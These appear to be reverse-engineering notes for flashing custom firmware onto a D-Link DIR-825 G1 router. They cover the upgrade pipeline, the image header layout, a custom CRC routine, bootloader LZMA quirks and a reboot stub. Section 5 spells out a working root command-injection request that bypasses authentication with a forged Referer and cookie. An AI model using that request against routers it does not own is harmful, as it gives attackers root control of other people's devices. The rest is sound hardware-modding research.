# DIR-825 G1 — reverse-engineering notes

All findings verified against our own unit (fw 7.00, board string `DIR825G1`, product `RTL8197DN_AC1200`, region `IN`, hw `1.0.6.2`). Binaries were pulled off the router with the RCE and disassembled with `mips-linux-gnu-objdump` (big-endian MIPS32).

## 1. The upgrade pipeline (stock)

```
web UI (Too_firmware.html)
  └─ multipart POST /cgi-bin/webupg  (field: firmware)
       └─ writes /var/image.img, runs /usr/bin/upgrader -c 3 -p /var/image.img -u <caller>
            └─ UPG_CheckValid()  ← all format validation lives here
            └─ creates /var/update_img flag, asks CMM daemon to reboot
                 └─ kernel machine_restart handler sees flag
                      └─ flash_update_img() reads /var/image.img and writes flash
```

Big (~4.7MB) multipart uploads also die in webupg before ever reaching upgrader — likely RAM limits (46MB total). TFTP-staging the file and creating the flag manually reproduces the same kernel-side path.

## 2. TBS image format ("old_img_hdr" / legacy path)

The upgrader accepts several formats; the legacy one is the simplest and is what our unit's config (no `TBSCFG01` magic in boot config → legacy layout) selects:

```
offset  size  field
0       144   header (see below)
144     N     payload written verbatim to flash @ 0x30000
-4      4     custom CRC-32 of everything before it
```

Header (144 bytes):

```
+0    20   reserved (zeros)
+20   4    u32 big-endian: total erase size (payload rounded to 64K)
+24   5    "imgs\0"
+32   17   product string #1 — MUST equal llconfig 'model' (RTL8197DN_AC1200)
+48   17   product string #2 (same check)
+80   8    hw version string (1.0.6.2)
+112  9    board id (DIR825G1)
+132  3    region (IN)
```

Validation order in `UPG_CheckValid` (upgrader.bin @ 0x401980):
1. CRC check (`UPG_CheckSum`): last 4 bytes vs computed value
2. size sanity vs `/proc/llconfig/flash_size` and `img_space`
3. product strcmp against the running system's product string
4. tail sniffing: last 160 bytes → if `TBSTLV01` at tail+144, TLV path (we use legacy, skip)

Kernel-side `flash_update_img` (stock vmlinux, base 0x80010000, function @ 0x80272808): reads the same 144-byte header, erases per u32@+20 from flash 0x30000, streams everything after byte 144. The kernel path does **not** re-check the product string — the flag file is the only gate.

## 3. The custom CRC

`tbs_crc_file` (upgrader.bin @ 0x4039f4): MSB-first update using the *reflected* zlib table interpreted as big-endian words, init 0, final complement:

```python
# table: 256 big-endian u32 at file offset 0x5080 of upgrader.bin
def tbs_crc(data, table):
    crc = 0
    for b in data:
        crc = ((crc << 8) & 0xFFFFFFFF) ^ table[((crc >> 24) ^ b) & 0xFF]
    return (~crc) & 0xFFFFFFFF
```

Check value: `tbs_crc(b"123456789") == 0x0361B23E`. This is NOT zlib.crc32, not CRC-32/MPEG-2 — table entries are the standard reflected table (`table[1]=0x77073096`, `table[128]=0xEDB88320`) but consumed in an MSB-first accumulator.

## 4. Bootloader constraints (the expensive lesson)

- mtd0 dump (192KB): minimal stage loader. Strings: `Booting...`, a hexdump table, `lzma`. **No IP/TFTP/HTTP anywhere.** No rescue mode over the network exists.
- It reads the kernel from flash 0x30000 as a raw LZMA-alone stream and decompresses it itself.
- Stock streams: props byte `0x5d`, dict 8MB, real size field. OpenWrt's pipeline emits `0x6d` (lc=1 lp=2) → decompression fails → silent boot loop. Repack with `0x5d` (lc=3 lp=0 pb=2) + explicit size field (`tools/make_factory_image.py --fix-lzma`).
- Boot config (llconfig) lives inside mtd0 at sector copies 0x10000 and 0x21000 (redundant): TLV-ish `NAME\0value` items — MAC, serial, region, model string, hw version, flash partition table (kernel size / config offset), Wi-Fi calibration MIBs (`HW_WLAN*_TX_POWER*`, `*XCAP`, `*THER`, 2.4G+5G sets). Kernel exposes items as files under `/proc/llconfig/`.

## 5. RCE on stock 7.00 (SAP10294)

```
POST /cgi-bin/webupg
Referer: http://<router>/autoupgrade.asp      <- auth bypass
Cookie: sessionid=<anything>; auth=ok
body:  name=shell&key=twmode&cmd=<percent-encoded command>
```

Runs as root. Percent-encode spaces (`%20`) or the shell mangles the command. See `tools/rce_shell.py` and the quirks in its docstring.

## 6. Reboot-with-command stub

`tools/restart2.s`: `sys_reboot(0xfee1dead, 0x28121969, 0x01234567, "image;9010;;;;")` — syscall 4164 on this MIPS kernel. The command string matches the stock upgrader's own reboot string; the kernel's restart handler looks for the `/var/update_img` flag regardless. Build: `mips-linux-gnu-as -EB -mips32` + `ld -Ttext=0x400000`.

First version of this stub passed `0xa1b2c3d4` as the cmd constant → `-EINVAL`, no reboot — and led to the fatal sequence in README warning #3. Constants matter.

## 7. What we'd do differently

1. Flash the *corrected* image before ever creating the flag file — stage files, build, verify, then flag+reboot in one motion.
2. Verify the LZMA props byte of the final image against stock **before** flashing (`xxd image | head -1` → expect `5d 00 00 80 00`).
3. Have the USB-TTL adapter already connected to the UART before any flash, watching the bootloader output live.
